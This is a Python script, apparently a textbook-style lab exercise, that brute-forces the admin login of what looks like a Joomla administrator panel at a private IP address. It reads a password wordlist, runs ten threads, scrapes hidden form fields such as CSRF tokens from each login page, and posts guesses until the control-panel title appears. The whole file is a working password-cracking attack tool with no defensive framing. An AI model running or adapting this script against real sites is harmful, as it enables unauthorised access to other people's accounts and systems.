import requests
import threading
import queue
import http.cookiejar as cj
import sys
from html.parser import HTMLParser

# default settings
user_thread     = 10
username        = "admin"
wordlist_file   = "/tmp/cain.txt"
resume          = None

# target specific settings
target_url = "http://192.168.112.131/administrator/index.php"
target_post = "http://192.168.112.131/administrator/index.php"

username_field = "username"
password_field = "passwd"

success_check = "Administration - Control Panel"


class Bruter(object):
    def __init__(self, username, words):
        self.username = username
        self.password_q = words
        self.found = False
        print(f"Finished setting up for: {username}")
    
    def run_bruteforce(self):
        for _ in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def web_bruter(self):
        session = requests.Session()

        while not self.password_q.empty() and not self.found:
            brute = self.password_q.get().strip()
        
            # initial req to grab cookies + form
            response = session.get(target_url)
            page = response.text
            print(f"Trying: {self.username}: {brute} ({self.password_q.qsize()} left)")

            # parse out the hidden fields
            parser = BruteParser()
            parser.feed(page)
            post_tags = parser.tag_results

            # add our username and password fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute

            # submit login form
            login_response = session.post(target_post, data=post_tags)
            login_result = login_response.text

            if success_check in login_result:
                self.found = True
                print("[*] Bruteforce successful :)")
                print(f"[*] Username: {self.username}")
                print(f"[*] Password: {brute}")
                print("[*] Waiting for other threads to exit...")


class BruteParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value

            if tag_name is not None:
                self.tag_results[tag_name] = tag_value


def build_wordlist(wordlist):
    # read the wordlist file
    with open(wordlist, "r") as f:
        words = [w.strip() for w in f.readlines()]

    q = queue.Queue()
    for word in words:
        q.put(word)

    return q, len(words)

def main():
    words_q, word_count = build_wordlist(wordlist_file)
    
    bruter_obj = Bruter(username, words_q)
    bruter_obj.run_bruteforce()

    while threading.active_count() > 1:
        pass


if __name__ == "__main__":
    main()